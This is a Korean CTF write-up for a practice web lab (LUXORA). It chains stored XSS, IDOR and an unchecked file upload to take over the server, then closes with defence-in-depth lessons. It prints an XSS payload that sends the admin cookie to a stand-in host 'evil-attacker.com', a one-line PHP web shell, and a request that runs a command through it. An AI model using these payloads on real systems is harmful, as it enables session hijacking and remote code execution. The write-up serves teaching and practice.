+++
title = "VulnABLE CTF [LUXORA] Write-up: Multi-Stage Attack 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Multi-Stage", "Bronze", "Attack Chain", "XSS", "IDOR", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Multi-Stage Attack 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Advanced Layer (Multi-Stage Attack)
- **난이도**: 🥉 Bronze
- **타겟 경로**: 여러 엔드포인트 복합 활용
- **목표**: 단일 취약점으로는 달성할 수 없는 시스템 장악을 위해, 1) **XSS**로 세션을 탈취하고, 2) **IDOR**로 관리자 권한을 획득한 후, 3) 최종적으로 **File Upload** 취약점을 이용해 웹 쉘을 올리는 '공격 체인(Attack Chain)'을 구성하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 취약점 맵핑 (Reconnaissance)

실제 해킹은 게임처럼 하나의 스테이지만 깨면 끝나는 것이 아닙니다. 지금까지 알아낸 LUXORA 시스템의 파편화된 취약점들을 하나로 엮어냅니다.

**[보유한 취약점 인벤토리]**
1. `/xss/silver` (리뷰 게시판): Stored XSS 가능 (이벤트 핸들러 방식). 하지만 관리자 쿠키는 `HttpOnly`가 걸려있지 않다고 가정.
2. `/idor/bronze` (프로필 조회): 파라미터(`user_id`) 조작으로 남의 정보 열람 가능. 하지만 수정(Update)은 관리자만 가능.
3. `/upload/bronze` (이미지 업로드): 파일 업로드 시 검증 누락. 하지만 일반 유저는 이 메뉴에 접근할 수 없음. (관리자 전용)

**[공격 마스터플랜]**
* **Stage 1**: 리뷰 게시판에 XSS를 심어 관리자의 세션 쿠키를 훔친다.
* **Stage 2**: 훔친 쿠키로 로그인하여 IDOR 취약점을 통해 시스템 구조와 관리자 API 주소를 파악한다.
* **Stage 3**: 탈취한 관리자 권한을 이용해 숨겨진 업로드 메뉴에 접근하고 쉘을 올린다!

---

## 💥 2. 공격 체인 실행 (Exploitation Chain)

### 📊 공격 흐름도 (Attack Flow)

```text
[ XSS ] --(Steal Cookie)--> [ IDOR ] --(Find Admin Panel)--> [ File Upload ] --(Web Shell)--> [ RCE ]
```


### 💡 Stage 1: XSS를 통한 Initial Access (초기 침투)
관리자가 읽는 리뷰 게시판에 악성 페이로드를 올립니다. 이번에는 단순 Alert가 아니라 쿠키를 탈취하는 페이로드입니다.

**[Stored XSS 페이로드]**
```html
Great product! <img src="x" onerror="fetch('http://evil-attacker.com/steal?cookie=' + document.cookie)">
```

잠시 후 해커 서버에 로그가 찍힙니다.
`[GET] /steal?cookie=session_id=admin_super_secret_cookie_123`
관리자 세션을 획득했습니다!

### 💡 Stage 2: IDOR를 이용한 내부 정보 수집
해커의 브라우저에서 쿠키를 `session_id=admin_super_secret_cookie_123` 으로 변경하고 시스템에 접속합니다.

관리자는 일반 유저와 달리 프로필 조회(`/idor/bronze`) 외에 시스템 설정 파일을 볼 수 있는 권한이 있습니다.
파라미터를 순회하며 데이터를 뒤집니다.
`GET /api/users/999` ➔ (시스템 봇 계정 발견)

여기서 관리자 대시보드의 숨겨진 URL인 `/admin/hidden-upload-panel` 을 찾아냅니다.

### 💡 Stage 3: File Upload를 통한 RCE 달성
알아낸 관리자 전용 업로드 패널(`/admin/hidden-upload-panel`)에 접속합니다. (관리자 세션을 가졌기에 403 에러가 뜨지 않습니다.)

이 폼은 Bronze 수준의 검증만 하므로, 일반적인 `shell.php` 를 업로드합니다.

```php
<?php system($_GET['cmd']); ?>
```

업로드가 성공하고 파일이 `/uploads/shell.php` 로 들어갑니다.

---

## 🚀 3. 최종 장악 및 결과 확인

마지막으로 우리가 업로드한 쉘을 터뜨릴 차례입니다.

```http
GET /uploads/shell.php?cmd=cat%20/flag_multistage_bronze.txt HTTP/1.1
```

### 🔍 서버의 응답
```text
FLAG{MULTISTAGE_🥉_XSS_IDOR_UPLOAD_CHAIN_A1B2C3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

실제 모의해킹(Pentesting) 실무와 동일하게, 사소해 보이는 취약점(XSS)이 권한 탈취(Session Hijacking)를 부르고, 그것이 다시 내부망 정보 수집(IDOR)과 시스템 장악(RCE)으로 눈덩이처럼 커지는 "취약점 체이닝(Vulnerability Chaining)"의 위력을 실증했습니다.

**🔥 획득한 플래그:**
`FLAG{MULTISTAGE_🥉_XSS_IDOR_UPLOAD_CHAIN_A1B2C3}`

### 🛡️ 취약점 원인 및 방어 철학 (Defense in Depth)
하나의 철조망만 넘으면 끝나는 시스템은 결코 안전하지 않습니다. 이를 심층 방어(Defense in Depth)의 부재라고 합니다.

* **안전한 아키텍처 방어 철학**
1. **HttpOnly 쿠키**: XSS가 터지더라도 세션은 털리지 않게 막아야 했습니다. (Stage 1 절단)
2. **IP 및 기기 바인딩**: 쿠키가 털리더라도, 접속하는 해커의 IP나 User-Agent가 관리자의 원래 IP와 다르면 세션을 파기해야 했습니다.
3. **분리된 관리자망**: 업로드 메뉴와 같은 관리자 전용 패널은 일반 서비스망과 분리된 사내 VPN망이나 허용된 IP 대역에서만 접근 가능하도록 방화벽을 쳐야 했습니다. (Stage 3 절단)
4. **철저한 파일 검증**: 당연히 마지막 업로드 단계에서도 파일 확장자와 MIME 타입을 엄격히 검사했어야 합니다.